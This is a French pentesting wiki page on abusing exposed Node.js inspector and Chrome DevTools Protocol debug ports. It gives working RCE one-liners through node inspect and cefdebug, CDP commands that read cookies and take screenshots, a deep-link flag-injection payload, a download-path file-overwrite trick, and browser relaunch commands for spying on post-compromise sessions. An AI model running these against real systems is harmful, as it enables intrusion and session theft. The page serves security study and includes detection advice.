# Abus de Node inspector/CEF debug

{{#include ../../banners/hacktricks-training.md}}

Les exemples pratiques historiques incluent le walkthrough Multimaster et l'attaque du debugger de Visual Studio Code liée à la CVE-2019-1414 ; utilisez-les comme contexte spécifique à certaines versions plutôt que de supposer que toutes les cibles Electron ou Chromium actuelles exposent les mêmes primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Informations de base

[D'après la documentation](https://nodejs.org/learn/getting-started/debugging) : lorsqu'un processus Node.js est démarré avec l'option `--inspect`, il écoute un client de debugging. Par **défaut**, il écoute sur l'hôte et le port **`127.0.0.1:9229`**. Chaque processus reçoit également un **UUID** **unique**.<sup>[[4]](#references)</sup>

Les clients Inspector doivent connaître et spécifier l'adresse de l'hôte, le port et l'UUID pour se connecter. Une URL complète ressemblera à quelque chose comme `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Comme le **debugger dispose d'un accès complet à l'environnement d'exécution de Node.js**, un acteur malveillant capable de se connecter à ce port peut être en mesure d'exécuter du code arbitraire au nom du processus Node.js (**escalation potentielle de privilèges**).<sup>[[4]](#references)</sup>

Il existe plusieurs façons de démarrer un Inspector :<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Lorsque vous démarrez un processus inspecté, quelque chose de similaire apparaîtra :<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Les processus basés sur **CEF** (**Chromium Embedded Framework**) peuvent exposer un debugger avec `--remote-debugging-port=9222`. Cela expose le navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) plutôt que via un inspecteur Node.js. Les payloads basés sur `process` de Node.js ne sont donc pas directement applicables par défaut.<sup>[[2]](#references)[[5]](#references)</sup>

Lorsque vous démarrez un navigateur avec le debugging activé, quelque chose comme ceci apparaît :<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Énumération et contrôle d’un endpoint CDP

Les endpoints HTTP de découverte distinguent le WebSocket du **browser** des WebSockets de chaque **target** (onglet, worker, extension, etc.). Interrogez `/json/version` pour obtenir l’endpoint du browser et `/json/list` pour les targets ; les valeurs `webSocketDebuggerUrl` renvoyées peuvent ensuite être contrôlées directement avec les messages de type JSON-RPC de CDP.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Par exemple, connectez-vous avec `websocat "$BROWSER_WS"` et envoyez `{"id":1,"method":"Target.getTargets"}` ou `{"id":2,"method":"Storage.getCookies"}`. Sur une cible de page (`websocat "$PAGE_WS"`), `Runtime.evaluate` s’exécute dans ce renderer et `Page.captureScreenshot` renvoie une capture d’écran encodée en base64. `document.cookie` ne peut pas révéler les cookies `HttpOnly`, tandis que `Storage.getCookies` demande au navigateur d’accéder à son cookie store.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Navigateurs, WebSockets et same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Les sites web ouverts dans un navigateur web peuvent effectuer des requêtes WebSocket et HTTP conformément au modèle de sécurité du navigateur. Une **connexion HTTP initiale** est nécessaire pour **obtenir un identifiant de session unique du debugger**. La **same-origin-policy** **empêche** les sites web d’établir **cette connexion HTTP**. Pour renforcer la sécurité contre les [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js vérifie que les **en-têtes 'Host'** de la connexion spécifient soit une **adresse IP**, soit **`localhost`** exactement.<sup>[[4]](#references)</sup>

> [!TIP]
> Cette **mesure de sécurité empêche d’exploiter l’inspector** pour exécuter du code en **envoyant simplement une requête HTTP** (ce qui pourrait être effectué en exploitant une vuln SSRF).<sup>[[4]](#references)</sup>

### Démarrer l’inspector dans des processus en cours d’exécution

Vous pouvez envoyer le **signal SIGUSR1** à un processus nodejs en cours d’exécution afin de le faire **démarrer l’inspector** sur le port par défaut. Cependant, notez que vous devez disposer de privilèges suffisants. Cela peut donc vous donner un **accès privilégié aux informations contenues dans le processus**, mais pas une privilege escalation directe.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Cela est utile dans les containers, car **arrêter le processus et en démarrer un nouveau** avec `--inspect` **n'est pas une option**, puisque le **container** sera **tué** avec le processus.<sup>[[6]](#references)</sup>

### Se connecter à l'inspector/debugger

Pour se connecter à un **navigateur basé sur Chromium**, les URLs `chrome://inspect` ou `edge://inspect` peuvent être utilisées respectivement pour Chrome ou Edge. En cliquant sur le bouton Configure, il faut s'assurer que le **host et le port cibles** sont correctement listés. L'image montre un exemple de Remote Code Execution (RCE) :<sup>[[2]](#references)[[4]](#references)</sup>

![Après une URL permettant d'accéder au debugger apparaîtra. p. ex. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Se connecter à l'inspector/debugger : Pour se connecter à un navigateur basé sur Chromium,...](<../../images/image (674).png>)

À l'aide de la **ligne de commande**, vous pouvez vous connecter à un debugger/inspector avec :<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
L’outil [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permet de **trouver les inspecteurs** exécutés localement et d’y **injecter du code**.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Notez que les exploits **RCE NodeJS** ne fonctionneront pas si vous êtes connecté à un navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (vous devez consulter l'API pour trouver des actions intéressantes à effectuer avec celui-ci).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE dans le Debugger/Inspector NodeJS

> [!TIP]
> Si vous êtes arrivé ici en cherchant comment obtenir une [**RCE à partir d'une XSS dans Electron, consultez cette page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Voici quelques méthodes courantes pour obtenir une **RCE** lorsque vous pouvez vous **connecter** à un **inspector** Node, en utilisant quelque chose comme (il semble que cela **ne fonctionnera pas avec une connexion au Chrome DevTools protocol**) :<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads du Chrome DevTools Protocol

Vous pouvez consulter l'API ici : [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Dans cette section, je vais simplement énumérer les éléments intéressants que j'ai trouvés et que des personnes ont utilisés pour exploiter ce protocole.

### Restriction du profil par défaut dans Chrome 136+

À partir de **Chrome 136**, Chrome ignore `--remote-debugging-port` et `--remote-debugging-pipe` lorsqu'ils ciblent le **répertoire de données Chrome par défaut**. Le switch doit être associé à un `--user-data-dir` non standard, dont la clé de chiffrement distincte et l'état isolé du navigateur empêchent la simple technique basée sur un flag d'exposer le profil authentifié habituel de l'utilisateur. Cette restriction spécifique à Chrome ne doit pas être considérée comme couvrant les anciennes versions de Chrome, Chrome for Testing, les applications Electron/CEF ou autres dérivés de Chromium sans vérification préalable.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Par conséquent, voir un processus Chrome actuel lancé uniquement avec `--remote-debugging-port` ne **prouve pas que CDP est devenu actif**. Confirmez le listener et `/json/version`, puis déterminez quel profil le prend réellement en charge.<sup>[[14]](#references)</sup>

### Injection de paramètres via des Deep Links

Dans le cadre de la [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino security a découvert qu’une application basée sur CEF avait **enregistré un UR**I personnalisé dans le système (workspaces://index.html), qui recevait l’URI complète, puis **lançait l’applicatio**n basée sur CEF avec une configuration partiellement construite à partir de cette URI.<sup>[[8]](#references)</sup>

Il a été découvert que les paramètres de l’URI étaient décodés au format URL et utilisés pour lancer l’application CEF de base, ce qui permettait à un utilisateur d’**injecter** le flag **`--gpu-launcher`** dans la **ligne de commande** et d’exécuter des actions arbitraires.<sup>[[8]](#references)</sup>

Ainsi, un payload comme :
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Exécutera calc.exe.<sup>[[8]](#references)</sup>

### Écraser des fichiers

Modifiez le dossier où les **fichiers téléchargés seront enregistrés** et téléchargez un fichier afin **d’écraser** le **code source** fréquemment utilisé par l’application avec votre **code malveillant**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE et exfiltration

STAR Labs a montré que des services WebDriver/CDP exposés peuvent permettre la lecture arbitraire de fichiers et la RCE ; le DNS rebinding peut compléter la chaîne d'exploitation dans certaines configurations.<sup>[[9]](#references)</sup>

Pour d'autres cas historiques liés à l'automatisation des navigateurs et à la sécurité de Chromium, consultez l'article de Counter WebDriver ainsi que les issues 773, 1742 et 1944 de Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Activation de CDP dans un processus Chromium actif

Sous Windows, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) a démontré que la restriction de la ligne de commande n'est pas le seul moyen d'activer CDP : du code déjà capable d'injecter du code dans un `msedge.exe` existant peut appeler la fonction non exportée de Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` et exposer le profil authentifié actif sans redémarrer le navigateur.<sup>[[15]](#references)</sup>

La chaîne démontrée injecte une DLL avec `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, résout les symboles internes d'Edge (d'abord à partir des PDB, puis avec des signatures d'octets spécifiques à la version), sous-classe la fenêtre du navigateur et publie un message afin que l'appel final de démarrage du serveur s'exécute sur le **thread UI** du navigateur. Le socket est lié à la loopback ; les primitives CDP standard peuvent ensuite récupérer les cookies, capturer les onglets, inspecter le trafic réseau ou évaluer du JavaScript dans des pages authentifiées.<sup>[[15]](#references)</sup>

> [!WARNING]
> Il s'agit d'une technique de **post-compromise/process-injection**, et non d'un contournement réseau non authentifié. Elle dépend fortement de la build, car les symboles C++ concernés ne sont pas exportés et les signatures peuvent changer après les mises à jour du navigateur.<sup>[[15]](#references)</sup>

Pour la détection, ne vous fiez pas uniquement à la télémétrie de la ligne de commande `--remote-debugging-*` : corrélez également les handles et opérations mémoire inhabituels visant les processus du navigateur (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, création de threads), l'injection de DLL et les sockets d'écoute loopback inattendus appartenant à Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Dans un environnement réel et **après avoir compromis** un PC utilisateur utilisant un navigateur basé sur Chromium, une technique historique consistait à relancer le navigateur avec le debugging activé et à transférer le port loopback. Cela peut exposer l'état de navigation de la victime sur les produits/builds qui acceptent encore le profil sélectionné, mais Chrome 136+ ne l'acceptera pas avec son répertoire de données par défaut.<sup>[[7]](#references)[[14]](#references)</sup>

La commande de relance originale est conservée ci-dessous pour les cibles anciennes ou spécifiques à une version. La seconde commande est la forme actuelle prise en charge par Chrome, mais elle crée un profil isolé au lieu de rouvrir l'état authentifié habituel de la victime.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
Pour les techniques spécifiques à macOS concernant le relancement de Chromium, les extensions et le CDP, consultez [Injection de Chromium sur macOS](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Outil d’inspection et d’exploitation du debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414 : Remote Code Execution de Visual Studio Code via le debugger Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guide de debugging Node.js - Premiers pas](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup de corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation : Abuser de la fonctionnalité de debugging de Chrome pour observer et contrôler à distance des sessions de navigation](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112 : Remote Code Execution dans AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Tu me parles ? - Remote Code Execution WebDriver via DNS Rebinding et CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - De Bot à Remote Code Execution](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (bug tracker Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (bug tracker Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (bug tracker Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Modifications des options de remote debugging pour améliorer la sécurité - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injecter CDP dans un navigateur Edge en cours d’exécution : analyse approfondie de l’instrumentation Runtime du navigateur](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
